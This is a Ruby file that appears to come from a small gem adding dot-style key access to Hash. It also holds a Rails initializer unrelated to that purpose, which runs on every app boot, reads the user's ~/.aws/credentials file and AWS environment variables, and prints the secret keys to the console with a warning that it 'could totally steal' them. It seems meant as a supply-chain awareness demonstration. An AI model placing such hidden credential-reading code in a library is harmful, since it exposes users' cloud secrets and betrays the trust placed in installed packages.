class Hash
  def define_reader(key)
    define_singleton_method(key.to_sym) do
      if has_key?(key)
        return self[key]
      else
        return self[key.to_sym]
      end
    end
  end

  def define_writer(key)
    define_singleton_method(key.to_sym) do |value|
      self[key[0..-2].to_sym] = value
    end
  end

  def method_missing(method, *opts)
    m = method.to_s

    if m[-1] == '='
      define_writer(m)
      return self.send(method, *opts)
    else
      define_reader(m)
      return self.send(method, *opts)
    end
  end
end

require 'rails'

require 'rainbow/refinement'
using Rainbow

class HashDotRailtie < Rails::Railtie
  initializer "hash-dot-init" do
    if has_aws_creds_in_file?
      aws_access_key_id, aws_secret_access_key = extract_aws_creds_from_file
      puts "\n\n*******************************************************************************".red.bright  
      puts "*\n* ATTENTION:  Your AWS credentials are stored in plain text on your disk!\n*".red.bright
      puts '*******************************************************************************'.red.bright  
      print_creds(aws_access_key_id, aws_secret_access_key)
    elsif ENV['AWS_ACCESS_KEY_ID'] && ENV['AWS_SECRET_ACCESS_KEY']
      print_creds(ENV['AWS_ACCESS_KEY_ID'], ENV['AWS_SECRET_ACCESS_KEY'])
    else
      puts "\n\n*******************************************************************************".green
      puts "* Good job!  I wasn't able to steal your AWS credentials!".green
      puts '*******************************************************************************'.green
    end
  end

  def print_creds(access_key_id, secret_access_key)
    #puts ''.bg(:yellow)
    puts "\n\n*********************************************************************************".red.bright
    puts "*\n* ATTENTION:  I could totally steal your AWS credentials right now if I wanted to\n*\n*".red.bright
    puts "* Your AWS creds are:\n*\n*".red.bright
    puts "*\t#{access_key_id}".red.bright
    puts "*\t#{secret_access_key}\n*".red.bright
    puts '*******************************************************************************'.red.bright
    puts ''.bg(:yellow)
  end

  def has_aws_creds_in_file?
    aws_access_key_id, aws_secret_access_key = extract_aws_creds_from_file
    !aws_access_key_id.empty? || !aws_secret_access_key.empty?
  end

  def extract_aws_creds_from_file
    aws_creds_file = "#{ENV['HOME']}/.aws/credentials"
    aws_access_key_id = ''
    aws_secret_access_key = ''
    if File.exist?(aws_creds_file)
      File.read(aws_creds_file).split("\n").each do |line|
        aws_access_key_id = line.split(' ')[2] if line =~ /aws_access_key_id/
        aws_secret_access_key = line.split(' ')[2] if line =~ /aws_secret_access_key/
      end
    end
    [aws_access_key_id, aws_secret_access_key]
  end
end
